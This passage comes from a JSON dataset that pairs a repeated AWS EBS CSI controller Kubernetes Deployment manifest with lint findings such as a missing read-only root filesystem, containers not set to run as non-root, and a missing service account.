    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "7280",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-snapshotter\" does not have a read-only root file system"
  },
  {
    "id": "7281",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ebs-plugin\" does not have a read-only root file system"
  },
  {
    "id": "7282",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "7283",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ebs-csi-controller-sa\" not found"
  },
  {
    "id": "7284",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-attacher\" is not set to runAsNonRoot"
  },
  {
    "id": "7285",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "7286",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        